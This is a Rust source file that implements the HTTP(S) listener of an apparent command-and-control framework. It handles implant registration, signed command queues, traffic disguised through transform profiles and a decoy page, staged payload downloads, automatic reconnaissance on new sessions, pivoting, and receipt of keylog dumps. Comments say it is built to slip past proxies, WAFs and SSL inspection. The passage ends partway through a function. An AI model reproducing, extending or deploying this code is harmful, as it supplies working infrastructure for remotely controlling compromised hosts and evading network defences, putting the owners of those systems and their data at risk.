// src/server/http_listener.rs
//
// HTTP(S) C2 listener. An axum-based HTTP server that handles agent
// check-ins over standard HTTP requests. This allows C2 traffic to
// traverse corporate proxies, WAFs, and SSL inspection appliances.
//
// Protocol:
//   POST / or /register        -> Agent registration (ClientHello JSON in body)
//                                Returns session_token + queued commands
//   GET any other path         -> Agent polls for commands (X-Session-Token header)
//   POST any other path        -> Agent sends command responses
//
// Non-C2 traffic gets a decoy page so the listener looks like a normal web server.

use axum::{
    routing::{get, post, any},
    extract::{Path, State},
    http::{StatusCode, HeaderMap},
    response::{IntoResponse, Response, Html},
    body::Bytes,
    Router,
};
use std::sync::{Arc, Mutex};
use std::collections::{HashMap, VecDeque};
use std::net::SocketAddr;
use ed25519_dalek::{SigningKey, Signer};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use chrono::Utc;
use tracing::{info, warn, error};

use crate::common::{
    ClientHello, SecuredCommand, CommandResponse, Session, SessionTransport, SharedSessions,
    MalleableProfile, PivotFrame, TransformStep, session_command_channel,
};
use crate::config::config;
use crate::database::{self, DbPool};
use crate::api::SharedResults;

struct HttpPivotSession {
    tx: tokio::sync::mpsc::UnboundedSender<Vec<u8>>,
    last_seen: Arc<std::sync::atomic::AtomicI64>,
    bridge_task: tokio::task::JoinHandle<()>,
    peer_addr: SocketAddr,
}

/// Per-session state managed behind a single lock. Using one Mutex
/// instead of four separate ones ensures that multi-field updates
/// (registration inserts into all four maps) are atomic. If a thread
/// panics mid-operation, all state is consistently behind one poisoned
/// lock rather than split across some-updated, some-not maps.
pub struct HttpInner {
    pub cmd_queues: HashMap<u32, VecDeque<SecuredCommand>>,
    pub token_map: HashMap<String, u32>,
    pub signing_keys: HashMap<u32, SigningKey>,
    pub counters: HashMap<u32, u64>,
    pub profiles: HashMap<u32, MalleableProfile>,
    /// Downstream pivot frames waiting for the parent agent's next poll.
    pub pivot_queues: HashMap<u32, VecDeque<PivotFrame>>,
    /// Recently seen auth_hmac values with their expiry time. Rejects duplicate
    /// registrations within the freshness window (prevents replay attacks from
    /// a network eavesdropper who captured a valid ClientHello).
    pub seen_hmacs: HashMap<String, chrono::DateTime<chrono::Utc>>,
    /// Per-IP staging requests as (window_start, request_count).
    pub stage_requests: HashMap<std::net::IpAddr, (chrono::DateTime<chrono::Utc>, u32)>,
}

/// Shared state for the HTTP C2 listener.
pub struct HttpC2State {
    pub sessions: SharedSessions,
    pub db: DbPool,
    pub results: SharedResults,
    pub inner: Mutex<HttpInner>,
    pivot_sessions: Mutex<HashMap<(u32, u32), HttpPivotSession>>,
    registration_lock: tokio::sync::Mutex<()>,
    prune_task: Mutex<Option<tokio::task::JoinHandle<()>>>,
}

impl HttpC2State {
    pub fn new(sessions: SharedSessions, db: DbPool, results: SharedResults) -> Self {
        Self {
            sessions, db, results,
            inner: Mutex::new(HttpInner {
                cmd_queues: HashMap::new(),
                token_map: HashMap::new(),
                signing_keys: HashMap::new(),
                counters: HashMap::new(),
                profiles: HashMap::new(),
                pivot_queues: HashMap::new(),
                seen_hmacs: HashMap::new(),
                stage_requests: HashMap::new(),
            }),
            pivot_sessions: Mutex::new(HashMap::new()),
            registration_lock: tokio::sync::Mutex::new(()),
            prune_task: Mutex::new(None),
        }
    }

    /// Remove only stale HTTP state owned by this listener for machine IDs and
    /// return the newest ID that can safely be reused. Live TLS sessions and
    /// live HTTP sessions owned by other listeners are left untouched.
    pub fn evict_reregistration_candidates(&self, candidate_ids: &[u32]) -> Option<u32> {
        let mut inner = self.inner.lock().unwrap_or_else(|e| e.into_inner());
        let mut evict_ids = Vec::new();
        let mut reusable = None;

        for id in candidate_ids {
            match self.sessions.get(id).map(|entry| entry.value().transport) {
                Some(SessionTransport::Tls) => continue,
                Some(SessionTransport::Http) => {
                    let owned_by_listener = inner.token_map.values().any(|token_id| token_id == id);
                    if !owned_by_listener {
                        continue;
                    }
                }
                None => {}
            }

            if reusable.is_none() {
                reusable = Some(*id);
            }
            evict_ids.push(*id);
        }

        let evict_set: std::collections::HashSet<u32> = evict_ids.iter().copied().collect();
        inner.token_map.retain(|_, id| !evict_set.contains(id));
        for id in evict_ids {
            self.sessions.remove(&id);
            inner.signing_keys.remove(&id);
            inner.cmd_queues.remove(&id);
            inner.counters.remove(&id);
            inner.profiles.remove(&id);
            inner.pivot_queues.remove(&id);
        }
        let mut pivots = self.pivot_sessions.lock().unwrap_or_else(|e| e.into_inner());
        let stale: Vec<(u32, u32)> = pivots.keys()
            .filter(|(parent, _)| evict_set.contains(parent))
            .copied()
            .collect();
        for key in stale {
            if let Some(pivot) = pivots.remove(&key) {
                pivot.bridge_task.abort();
            }
        }
        reusable
    }

    fn set_prune_task(&self, handle: tokio::task::JoinHandle<()>) {
        let mut task = self.prune_task.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(previous) = task.replace(handle) {
            previous.abort();
        }
    }

    fn abort_prune_task(&self) {
        let mut task = self.prune_task.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(task) = task.take() {
            task.abort();
        }
    }

    /// Queue a command for a session. Called when operators send commands
    /// via the API to HTTP-transported sessions.
    pub fn queue_command(&self, session_id: u32, command: String) -> u64 {
        let command_for_log = command.clone();
        let mut queued = false;
        let req_id = {
            let mut inner = self.inner.lock().unwrap_or_else(|e| {
                tracing::error!("HttpC2State mutex poisoned during queue_command — recovering");
                e.into_inner()
            });
            let counter = inner.counters.entry(session_id).or_insert(0);
            *counter += 1;
            let req_id = *counter;

            if let Some(signing_key) = inner.signing_keys.get(&session_id) {
                let mut cmd = SecuredCommand {
                    session_id: "sess".to_string(),
                    counter: req_id,
                    nonce: rand::random(),
                    timestamp: Utc::now(),
                    command,
                    signature: String::new(),
                };
                let sig = signing_key.sign(&cmd.get_signable_bytes());
                cmd.signature = BASE64.encode(sig.to_bytes());

                let queue = inner.cmd_queues.entry(session_id).or_default();
                // Backpressure: if an agent is offline or polling very infrequently,
                // commands pile up in memory indefinitely. Cap the queue depth to
                // prevent OOM from operators mass-queueing commands to dead sessions.
                if queue.len() >= config().server.max_queued_commands {
                    tracing::warn!(session_id, "Command queue full ({} pending), dropping oldest", queue.len());
                    queue.pop_front();
                }
                queue.push_back(cmd);
                queued = true;
            }
            req_id
        };

        if queued {
            let db = self.db.clone();
            tokio::task::spawn_blocking(move || {
                match db.get() {
                    Ok(conn) => database::log_command(&conn, session_id, req_id, &command_for_log),
                    Err(e) => error!(session_id, error = %e, "Failed to log HTTP command"),
                }
            });
        }

        req_id
    }

    /// Prune HTTP sessions that haven't been seen for the given duration.
    /// Without periodic cleanup, dead/restarted agents accumulate entries
    /// in token_map, signing_keys, cmd_queues, and counters indefinitely,
    /// eventually causing an OOM crash on the C2 server.
    pub fn prune_stale_sessions(&self, max_age_secs: i64) {
        let now = chrono::Utc::now().timestamp();

        let owned_ids: std::collections::HashSet<u32> = {
            let inner = self.inner.lock().unwrap_or_else(|e| e.into_inner());
            inner.token_map.values().copied().collect()
        };
        if owned_ids.is_empty() { return; }

        // Find stale IDs registered with this listener. Other HTTP listeners
        // keep independent tokens and queues for their own sessions.
        let stale_ids: Vec<u32> = {
            let sessions = self.sessions.iter();
            sessions
                .filter(|entry| {
                    entry.value().transport == SessionTransport::Http
                        && owned_ids.contains(entry.key())
                        && now - entry.value().last_seen.load(std::sync::atomic::Ordering::Relaxed) > max_age_secs
                })
                .map(|entry| *entry.key())
                .collect()
        };

        if stale_ids.is_empty() { return; }

        let mut inner = self.inner.lock().unwrap_or_else(|e| {
            tracing::error!("HttpC2State mutex poisoned during prune — recovering");
            e.into_inner()
        });

        // Remove stale sessions from all maps. Use a HashSet for O(1) lookups
        // during the token_map retain - the old code called retain() inside a
        // for loop, creating O(N*M) complexity that blocked the mutex during
        // large cleanup cycles, freezing all HTTP C2 traffic.
        let stale_set: std::collections::HashSet<u32> = stale_ids.iter().copied().collect();
        let pruned = stale_set.len();

        for &sid in &stale_set {
            inner.cmd_queues.remove(&sid);
            inner.signing_keys.remove(&sid);
            inner.counters.remove(&sid);
            inner.profiles.remove(&sid);
            inner.pivot_queues.remove(&sid);
        }
        // Single O(M) pass over token_map instead of N × O(M)
        inner.token_map.retain(|_, v| !stale_set.contains(v));

        // Also remove from the central SharedSessions DashMap - the old code
        // forgot this, leaking Session structs (channels, keys, metadata)
        // indefinitely until OOM.
        for &sid in &stale_set {
            self.sessions.remove(&sid);
        }
        let mut pivots = self.pivot_sessions.lock().unwrap_or_else(|e| e.into_inner());
        let stale_pivots: Vec<(u32, u32)> = pivots.keys()
            .filter(|(parent, _)| stale_set.contains(parent))
            .copied()
            .collect();
        for key in stale_pivots {
            if let Some(pivot) = pivots.remove(&key) {
                pivot.bridge_task.abort();
            }
        }

        if pruned > 0 {
            tracing::info!("Pruned {} stale HTTP sessions (>{max_age_secs}s idle)", pruned);
        }
    }
}

impl Drop for HttpC2State {
    fn drop(&mut self) {
        self.abort_prune_task();
    }
}

struct PruneTaskGuard {
    state: Arc<HttpC2State>,
}

impl Drop for PruneTaskGuard {
    fn drop(&mut self) {
        self.state.abort_prune_task();
    }
}

#[doc(hidden)]
pub fn apply_profile_body_transform(data: &[u8], steps: &[TransformStep]) -> Vec<u8> {
    let mut buffer = data.to_vec();
    for step in steps {
        match step {
            TransformStep::Base64 => buffer = BASE64.encode(&buffer).into_bytes(),
            TransformStep::Hex => buffer = hex::encode(&buffer).into_bytes(),
            TransformStep::Mask(key) if !key.is_empty() => {
                for (i, byte) in buffer.iter_mut().enumerate() {
                    *byte ^= key[i % key.len()];
                }
            }
            TransformStep::Mask(_) => {}
            TransformStep::Prepend(s) => {
                let mut next = s.as_bytes().to_vec();
                next.extend_from_slice(&buffer);
                buffer = next;
            }
            TransformStep::Append(s) => buffer.extend_from_slice(s.as_bytes()),
        }
    }
    buffer
}

#[doc(hidden)]
pub fn reverse_profile_body_transform(data: &[u8], steps: &[TransformStep]) -> Result<Vec<u8>, String> {
    let mut buffer = data.to_vec();
    for step in steps.iter().rev() {
        match step {
            TransformStep::Base64 => {
                let clean: Vec<u8> = buffer.into_iter().filter(|b| !b.is_ascii_whitespace()).collect();
                buffer = BASE64.decode(&clean).map_err(|e| e.to_string())?;
            }
            TransformStep::Hex => buffer = hex::decode(&buffer).map_err(|e| e.to_string())?,
            TransformStep::Mask(key) if !key.is_empty() => {
                for (i, byte) in buffer.iter_mut().enumerate() {
                    *byte ^= key[i % key.len()];
                }
            }
            TransformStep::Mask(_) => {}
            TransformStep::Prepend(s) => {
                let prefix = s.as_bytes();
                if !buffer.starts_with(prefix) {
                    return Err("prepend transform mismatch".to_string());
                }
                buffer = buffer[prefix.len()..].to_vec();
            }
            TransformStep::Append(s) => {
                let suffix = s.as_bytes();
                if !buffer.ends_with(suffix) {
                    return Err("append transform mismatch".to_string());
                }
                buffer.truncate(buffer.len() - suffix.len());
            }
        }
    }
    Ok(buffer)
}

fn profile_for_session(state: &HttpC2State, sess_id: u32) -> MalleableProfile {
    state.inner.lock().unwrap_or_else(|e| e.into_inner())
        .profiles.get(&sess_id).cloned().unwrap_or_default()
}

fn profile_get_response(profile: &MalleableProfile, plaintext: Vec<u8>) -> Response {
    let transformed = apply_profile_body_transform(&plaintext, &profile.http_get.data_transform);
    let mut builder = axum::http::Response::builder().status(StatusCode::OK);
    let content_type = if profile.http_get.data_transform.is_empty() {
        "application/json"
    } else {
        "application/octet-stream"
    };
    builder = builder.header(axum::http::header::CONTENT_TYPE, content_type);
    for (name, value) in &profile.http_get.headers {
        if let (Ok(name), Ok(value)) = (
            axum::http::HeaderName::from_bytes(name.as_bytes()),
            axum::http::HeaderValue::from_str(value),
        ) {
            builder = builder.header(name, value);
        }
    }
    builder.body(axum::body::Body::from(transformed)).unwrap().into_response()
}

const STAGE_RATE_LIMIT: u32 = 10;
const STAGE_RATE_WINDOW_SECS: i64 = 60;
const STAGE_AUTH_WINDOW_SECS: i64 = 300;

#[doc(hidden)]
pub fn stage_artifact_path(build_id: &str) -> Option<std::path::PathBuf> {
    let parsed = uuid::Uuid::parse_str(build_id).ok()?;
    if parsed.to_string() != build_id {
        return None;
    }
    Some(std::env::current_dir().ok()?
        .join("dist")
        .join(format!("staged_{}.payload", build_id)))
}

#[doc(hidden)]
pub fn find_stage_challenge_key(conn: &rusqlite::Connection, build_id: &str) -> Option<Vec<u8>> {
    use subtle::ConstantTimeEq;
    let mut stmt = conn.prepare("SELECT build_id, challenge_key FROM build_keys").ok()?;
    let rows = stmt.query_map([], |row| {
        Ok((row.get::<_, String>(0)?, row.get::<_, Option<Vec<u8>>>(1)?))
    }).ok()?;
    for row in rows.flatten() {
        let matches: bool = row.0.as_bytes().ct_eq(build_id.as_bytes()).into();
        if matches {
            return row.1;
        }
    }
    None
}

#[doc(hidden)]
pub fn verify_stage_auth(
    challenge_key: &[u8],
    build_id: &str,
    timestamp: &str,
    hmac_b64: &str,
) -> bool {
    let timestamp_value: i64 = match timestamp.parse() {
        Ok(v) => v,
        Err(_) => return false,
    };
    if (Utc::now().timestamp() - timestamp_value).abs() > STAGE_AUTH_WINDOW_SECS {
        return false;
    }
    let received = match BASE64.decode(hmac_b64.as_bytes()) {
        Ok(v) => v,
        Err(_) => return false,
    };
    use hmac::{Hmac, Mac};
    use sha2::Sha256;
    let mut mac = match Hmac::<Sha256>::new_from_slice(challenge_key) {
        Ok(mac) => mac,
        Err(_) => return false,
    };
    mac.update(build_id.as_bytes());
    mac.update(b":");
    mac.update(timestamp.as_bytes());
    mac.verify_slice(&received).is_ok()
}

#[doc(hidden)]
pub fn verify_stage_api_key(conn: &rusqlite::Connection, api_key: &str) -> bool {
    !api_key.is_empty()
        && (database::get_operator_by_session_key(conn, api_key).is_some()
            || database::get_operator_by_key(conn, api_key).is_some())
}

#[doc(hidden)]
pub fn stage_request_authorized(
    conn: &rusqlite::Connection,
    challenge_key: &[u8],
    build_id: &str,
    headers: &HeaderMap,
) -> bool {
    let timestamp = headers.get("x-stage-timestamp")
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default();
    let auth = headers.get("x-stage-hmac")
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default();
    let hmac_valid = verify_stage_auth(challenge_key, build_id, timestamp, auth);
    let api_key_valid = headers.get("x-api-key")
        .and_then(|v| v.to_str().ok())
        .map(|api_key| verify_stage_api_key(conn, api_key))
        .unwrap_or(false);
    hmac_valid || api_key_valid
}

#[doc(hidden)]
pub fn check_stage_rate_limit(state: &HttpC2State, ip: std::net::IpAddr) -> bool {
    let now = Utc::now();
    let mut inner = state.inner.lock().unwrap_or_else(|e| e.into_inner());
    let entry = inner.stage_requests.entry(ip).or_insert((now, 0));
    if (now - entry.0).num_seconds() >= STAGE_RATE_WINDOW_SECS {
        *entry = (now, 0);
    }
    entry.1 += 1;
    entry.1 <= STAGE_RATE_LIMIT
}

/// GET /stage/<build_id> - authenticated single-artifact staging download.
async fn handle_stage(
    State(state): State<Arc<HttpC2State>>,
    axum::extract::ConnectInfo(addr): axum::extract::ConnectInfo<SocketAddr>,
    Path(build_id): Path<String>,
    headers: HeaderMap,
) -> Response {
    if !check_stage_rate_limit(&state, addr.ip()) {
        return StatusCode::TOO_MANY_REQUESTS.into_response();
    }

    let artifact_path = match stage_artifact_path(&build_id) {
        Some(path) => path,
        None => return StatusCode::NOT_FOUND.into_response(),
    };
    let conn = match state.db.get() {
        Ok(conn) => conn,
        Err(_) => return StatusCode::NOT_FOUND.into_response(),
    };
    let challenge_key = match find_stage_challenge_key(&conn, &build_id) {
        Some(key) => key,
        None => return StatusCode::NOT_FOUND.into_response(),
    };
    if !stage_request_authorized(&conn, &challenge_key, &build_id, &headers) {
        warn!(ip = %addr.ip(), "Rejected staged payload request");
        return StatusCode::NOT_FOUND.into_response();
    }

    match tokio::fs::read(&artifact_path).await {
        Ok(payload) => (
            [
                (axum::http::header::CONTENT_TYPE, "application/octet-stream"),
                (axum::http::header::CACHE_CONTROL, "no-store"),
            ],
            payload,
        ).into_response(),
        Err(_) => StatusCode::NOT_FOUND.into_response(),
    }
}

#[doc(hidden)]
pub fn http_tls_acceptor(cert_pem: &[u8], key_der: &[u8]) -> Result<tokio_rustls::TlsAcceptor, String> {
    use tokio_rustls::rustls;
    let certs: Vec<rustls::Certificate> = rustls_pemfile::certs(&mut std::io::BufReader::new(cert_pem))
        .map_err(|e| format!("invalid HTTPS server certificate: {}", e))?
        .into_iter()
        .map(rustls::Certificate)
        .collect();
    if certs.is_empty() {
        return Err("HTTPS server certificate chain is empty".to_string());
    }
    let mut tls_config = rustls::ServerConfig::builder()
        .with_safe_defaults()
        .with_no_client_auth()
        .with_single_cert(certs, rustls::PrivateKey(key_der.to_vec()))
        .map_err(|e| format!("invalid HTTPS server key: {}", e))?;
    tls_config.alpn_protocols = vec![b"http/1.1".to_vec()];
    Ok(tokio_rustls::TlsAcceptor::from(Arc::new(tls_config)))
}

/// Bind and prepare the HTTP C2 listener. The bind happens eagerly so the
/// listener manager can fail creation instead of recording a dead listener.
pub fn start(
    state: Arc<HttpC2State>,
    port: u16,
    use_tls: bool,
    cert_pem: &[u8],
    key_der: &[u8],
) -> Result<std::pin::Pin<Box<dyn std::future::Future<Output = Result<(), String>> + Send>>, String> {
    let app = Router::new()
        .route("/", post(handle_register))
        .route("/register", post(handle_register))
        .route("/stage/:build_id", get(handle_stage))
        .fallback(any(handle_c2_or_decoy))
        // C2 POST bodies can be large (chunked downloads ~2.8 MB, keylog
        // dumps); axum's 2 MiB DefaultBodyLimit would 413 them. Mirror the
        // API router's cap (src/api/mod.rs); both read the same config key.
        .layer(axum::extract::DefaultBodyLimit::max(config().server.http_body_limit_bytes))
        .with_state(state.clone());

    let addr = SocketAddr::from(([0, 0, 0, 0], port));
    let listener = std::net::TcpListener::bind(addr)
        .map_err(|e| format!("bind failed on port {}: {}", port, e))?;
    listener.set_nonblocking(true)
        .map_err(|e| format!("failed to prepare port {}: {}", port, e))?;
    let tls_acceptor = if use_tls {
        Some(http_tls_acceptor(cert_pem, key_der)?)
    } else {
        None
    };

    info!(port, tls = use_tls, "HTTP C2 listener started");

    // Periodic cleanup of stale HTTP sessions. Without this, dead agents
    // accumulate entries in token_map/signing_keys/cmd_queues/counters
    // indefinitely, eventually causing OOM on the C2 server.
    let cleanup_state = Arc::downgrade(&state);
    let prune_task = tokio::spawn(async move {
        let mut interval = tokio::time::interval(std::time::Duration::from_secs(
            config().server.http_prune_interval_secs,
        ));
        loop {
            interval.tick().await;
            let Some(state) = cleanup_state.upgrade() else { break; };
            state.prune_stale_sessions(config().server.http_prune_idle_secs);
        }
    });
    state.set_prune_task(prune_task);
    let prune_task_guard = PruneTaskGuard { state };

    if let Some(acceptor) = tls_acceptor {
        let listener = tokio::net::TcpListener::from_std(listener)
            .map_err(|e| format!("failed to prepare HTTPS port {}: {}", port, e))?;
        Ok(Box::pin(async move {
            use tower::Service as _;
            let _prune_task_guard = prune_task_guard;
            loop {
                let (stream, addr) = match listener.accept().await {
                    Ok(conn) => conn,
                    Err(e) => {
                        error!(port, error = %e, "HTTPS listener accept failed");
                        continue;
                    }
                };
                let acceptor = acceptor.clone();
                let app_conn = app.clone();
                let service = hyper::service::service_fn(move |mut request: hyper::Request<hyper::Body>| {
                    let mut app = app_conn.clone();
                    async move {
                        request.extensions_mut().insert(axum::extract::ConnectInfo(addr));
                        app.call(request).await
                    }
                });
                tokio::spawn(async move {
                    match acceptor.accept(stream).await {
                        Ok(tls_stream) => {
                            if let Err(e) = hyper::server::conn::Http::new()
                                .serve_connection(tls_stream, service)
                                .with_upgrades()
                                .await
                            {
                                warn!(peer = %addr, error = %e, "HTTPS connection error");
                            }
                        }
                        Err(e) => warn!(peer = %addr, error = %e, "HTTPS handshake failed"),
                    }
                });
            }
        }))
    } else {
        let server = axum::Server::from_tcp(listener)
            .map_err(|e| format!("failed to serve port {}: {}", port, e))?
            .serve(app.into_make_service_with_connect_info::<SocketAddr>());
        Ok(Box::pin(async move {
            let _prune_task_guard = prune_task_guard;
            server.await.map_err(|e| {
                error!(port, error = %e, "HTTP C2 listener error");
                e.to_string()
            })
        }))
    }
}

/// POST / - Agent registration. Receives ClientHello, returns session token.
async fn handle_register(
    State(state): State<Arc<HttpC2State>>,
    _headers: HeaderMap,
    axum::extract::ConnectInfo(addr): axum::extract::ConnectInfo<SocketAddr>,
    body: Bytes,
) -> Response {
    let hello: ClientHello = match serde_json::from_slice(&body) {
        Ok(h) => h,
        Err(_) => return decoy_page().into_response(),
    };

    // Look up build info for authentication
    let (signing_key, profile_name, active_profile) = {
        let conn = match state.db.get() {
            Ok(c) => c,
            Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
        };

        match database::get_build_info(&conn, &hello.build_id) {
            Some((key_bytes, name, profile_json, challenge_key)) => {
                let active_profile = profile_json
                    .as_deref()
                    .and_then(|json| serde_json::from_str::<MalleableProfile>(json).ok())
                    .unwrap_or_default();
                let key: [u8; 32] = match key_bytes.try_into() {
                    Ok(a) => a,
                    Err(_) => return decoy_page().into_response(),
                };

                // Verify auth_hmac if build has a challenge_key
                if let Some(ref ck) = challenge_key {
                    if hello.auth_hmac.is_empty() {
                        warn!("Missing auth_hmac from {} for build {}", addr.ip(), hello.build_id);
                        return decoy_page().into_response();
                    }

                    // Replay protection: reject registrations with stale or missing
                    // timestamps. The timestamp is included in the HMAC, so an
                    // attacker can't forge one. But an empty timestamp skipped
                    // this entire check - reject it when a challenge_key exists.
                    if hello.reg_timestamp.is_empty() {
                        warn!("Missing reg_timestamp from {} for build {} (replay attempt?)", addr.ip(), hello.build_id);
                        return decoy_page().into_response();
                    }
                    if let Ok(ts) = chrono::DateTime::parse_from_rfc3339(&hello.reg_timestamp) {
                        let age = (Utc::now() - ts.with_timezone(&Utc)).num_seconds().abs();
                        // Freshness window covers clock skew both ways.
                        if age > config().server.registration_hmac_window_secs {
                            warn!("Stale registration timestamp ({age}s old) from {} for build {}", addr.ip(), hello.build_id);
                            return decoy_page().into_response();
                        }
                    } else {
                        warn!("Malformed reg_timestamp from {} for build {}", addr.ip(), hello.build_id);
                        return decoy_page().into_response();
                    }

                    use hmac::{Hmac, Mac};
                    use sha2::Sha256;
                    type HmacSha256 = Hmac<Sha256>;
                    // The challenge_key is stored as raw bytes (BLOB) in the DB.
                    // The agent decodes the base64 config value to get the same
                    // raw bytes. Use them directly - no decoding needed here.
                    let ck_decoded = ck.clone();
                    if let Ok(mut mac) = <HmacSha256 as Mac>::new_from_slice(&ck_decoded) {
                        // Length-prefix each field before hashing to prevent
                        // concatenation collisions. Without delimiters,
                        // build_id="12" + exe_id="345" hashes identically to
                        // build_id="123" + exe_id="45" (both produce "12345").
                        mac.update(&(hello.build_id.len() as u32).to_le_bytes());
                        mac.update(hello.build_id.as_bytes());
                        mac.update(&(hello.exe_id.len() as u32).to_le_bytes());
                        mac.update(hello.exe_id.as_bytes());
                        mac.update(&(hello.reg_timestamp.len() as u32).to_le_bytes());
                        mac.update(hello.reg_timestamp.as_bytes());
                        let received_raw = match BASE64.decode(hello.auth_hmac.as_bytes()) {
                            Ok(b) => b,
                            Err(_) => {
                                warn!("Malformed auth_hmac base64 from {} for build {}", addr.ip(), hello.build_id);
                                return decoy_page().into_response();
                            }
                        };
                        if mac.verify_slice(&received_raw).is_err() {
                            warn!("Invalid auth_hmac from {} for build {}", addr.ip(), hello.build_id);
                            return decoy_page().into_response();
                        }

                        // Replay dedup: ONLY insert after HMAC verification succeeds.
                        // The old code checked/inserted in a separate block that could
                        // be reached without HMAC validation (e.g., if challenge_key was
                        // absent but auth_hmac was non-empty). This let attackers flood
                        // the cache with garbage HMACs, triggering the overflow cap and
                        // locking out ALL legitimate agents globally.
                        let now_replay = Utc::now();
                        let prune_threshold = config().server.seen_hmac_prune_threshold;
                        {
                            let mut inner = state.inner.lock().unwrap_or_else(|e| e.into_inner());
                            if inner.seen_hmacs.len() > prune_threshold {
                                inner.seen_hmacs.retain(|_, exp| *exp > now_replay);
                            }

                            if inner.seen_hmacs.contains_key(&hello.auth_hmac) {
                                warn!("Replayed auth_hmac from {} for build {}", addr.ip(), hello.build_id);
                                return decoy_page().into_response();
                            }
                            // Expire entries just past the HMAC freshness
                            // window so replays inside it stay rejected.
                            inner.seen_hmacs.insert(
                                hello.auth_hmac.clone(),
                                now_replay + chrono::Duration::seconds(
                                    config().server.registration_hmac_window_secs + 10,
                                ),
                            );
                        }
                    }
                }

                (SigningKey::from_bytes(&key), name, active_profile)
            }
            None => {
                warn!(build_id = %hello.build_id, ip = %addr.ip(), "Unknown build ID via HTTP");
                return decoy_page().into_response();
            }
        }
    };

    // Serialize machine re-registration so two polls from the same agent cannot
    // race to claim the same prior row. New-machine allocation remains the B-01
    // sequence path; a matching prior row is refreshed and keeps its history.
    let _registration_guard = state.registration_lock.lock().await;
    let sess_id = {
        let conn = match state.db.get() {
            Ok(c) => c,
            Err(e) => {
                error!(ip = %addr.ip(), error = %e, "HTTP registration failed: database pool unavailable");
                return StatusCode::INTERNAL_SERVER_ERROR.into_response();
            }
        };
        let candidates = database::find_machine_session_ids(
            &conn, &hello.computer_id, &hello.hostname,
        );
        let reusable_id = state.evict_reregistration_candidates(&candidates);
        match reusable_id {
            Some(id) => match database::reregister_session(
                &conn, id, &hello.exe_id, &hello.computer_id, &hello.hostname,
                &hello.os, &addr.ip().to_string(), &hello.build_id, &profile_name,
            ) {
                Ok(()) => id,
                Err(e) => {
                    error!(ip = %addr.ip(), error = %e, "HTTP re-registration failed");
                    return StatusCode::INTERNAL_SERVER_ERROR.into_response();
                }
            },
            None => match database::register_session(
                &conn, &hello.exe_id, &hello.computer_id, &hello.hostname,
                &hello.os, &addr.ip().to_string(), &hello.build_id, &profile_name,
            ) {
                Ok(id) => id,
                Err(e) => {
                    error!(ip = %addr.ip(), error = %e, "HTTP registration failed: session id allocation/insert");
                    return StatusCode::INTERNAL_SERVER_ERROR.into_response();
                }
            },
        }
    };
    let session_token = format!("{}_{}", sess_id, uuid::Uuid::new_v4());

    // Seed the RCM package fingerprint for this target (SPEC §5.3) - but
    // ONLY if a package already exists on disk. Registration (especially
    // from unauthenticated legacy builds) must never create a package
    // directory tree; packages are created lazily on the first artifact.
    crate::server::session::seed_rcm_fingerprint(&hello.hostname, &hello.computer_id, &hello.os);

    // Register session in shared state
    // The tx channel is what the API uses to send commands. We bridge it
    // to the HTTP command queue via a spawned reader task.
    let (tx, mut rx) = session_command_channel(config().server.session_command_channel);
    let tx_recon = tx.clone();
    let last_seen = Arc::new(std::sync::atomic::AtomicI64::new(Utc::now().timestamp()));

    state.sessions.insert(sess_id, Session {
        id: sess_id,
        transport: SessionTransport::Http,
        computer_id: hello.computer_id,
        addr,
        hostname: hello.hostname.clone(),
        os: hello.os.clone(),
        tx,
        signing_key: signing_key.clone(),
        parent_id: None,
        last_seen: last_seen.clone(),
        interfaces: hello.interfaces.clone(),
        hibernation_mode: hello.hibernation_mode,
    });

    {
        let mut inner = state.inner.lock().unwrap_or_else(|e| {
            tracing::error!("HttpC2State mutex poisoned during registration — recovering");
            e.into_inner()
        });
        inner.token_map.insert(session_token.clone(), sess_id);
        inner.signing_keys.insert(sess_id, signing_key);
        inner.cmd_queues.insert(sess_id, VecDeque::new());
        inner.counters.insert(sess_id, 0);
        inner.profiles.insert(sess_id, active_profile);
    }

    // Bridge: read from the session's tx channel (fed by the API's send_command)
    // and push into the HTTP command queue for the agent to pick up on next poll.
    {
        let state_bridge = state.clone();
        tokio::spawn(async move {
            while let Some((command, callback)) = rx.recv().await {
                let req_id = state_bridge.queue_command(sess_id, command);
                if let Some(cb) = callback {
                    let _ = cb.send(req_id);
                }
            }
        });
    }

    info!(session_id = sess_id, ip = %addr.ip(), hostname = %hello.hostname, "HTTP session registered");
    println!("\n[+] HTTP Session {}: {} ({}) [{}]", sess_id, addr.ip(), hello.hostname, hello.os);

    crate::server::session::notify_new_session_webhook(
        state.db.clone(),
        sess_id,
        hello.hostname.clone(),
        addr.ip().to_string(),
        hello.os.clone(),
    );

    // Auto-recon uses the same runner as TLS sessions so module: entries are
    // executed server-side instead of being sent raw to the HTTP agent.
    crate::server::session::spawn_auto_recon(sess_id, state.db.clone(), tx_recon);

    // Return session token + any queued commands. Positional array mirrors
    // the agent-side RegisterResponse seq struct in
    // src/agent/http_transport.rs: [token, commands].
    let queued = drain_commands(&state, sess_id);
    let response = serde_json::json!([session_token, queued]);

    (StatusCode::OK, axum::Json(response)).into_response()
}

pub enum HttpOutboundItem {
    Pivot(PivotFrame),
    Result(CommandResponse),
}

/// Pivot frames classify first, mirroring the raw-stream reader and the
/// agent-side HTTP classifier.
#[doc(hidden)]
pub fn parse_http_outbound(body: &[u8]) -> Option<HttpOutboundItem> {
    if let Ok(frame) = serde_json::from_slice::<PivotFrame>(body) {
        return Some(HttpOutboundItem::Pivot(frame));
    }
    serde_json::from_slice::<CommandResponse>(body).ok().map(HttpOutboundItem::Result)
}

fn remove_http_pivot(state: &HttpC2State, parent_id: u32, child_id: u32) -> Option<HttpPivotSession> {
    let removed = state.pivot_sessions.lock().unwrap_or_else(|e| e.into_inner())
        .remove(&(parent_id, child_id));
    if let Some(ref pivot) = removed {
        pivot.bridge_task.abort();
    }
    removed
}

fn enqueue_http_pivot_frame(state: &HttpC2State, parent_id: u32, frame: PivotFrame) {
    let mut inner = state.inner.lock().unwrap_or_else(|e| e.into_inner());
    let queue = inner.pivot_queues.entry(parent_id).or_default();
    if queue.len() >= config().server.max_queued_commands {
        queue.pop_front();
    }
    queue.push_back(frame);
}

async fn route_http_pivot_frame(
    state: &Arc<HttpC2State>,
    parent_id: u32,
    addr: SocketAddr,
    frame: PivotFrame,
) {
    let child_id = frame.source;
    if child_id == 0 {
        return;
    }

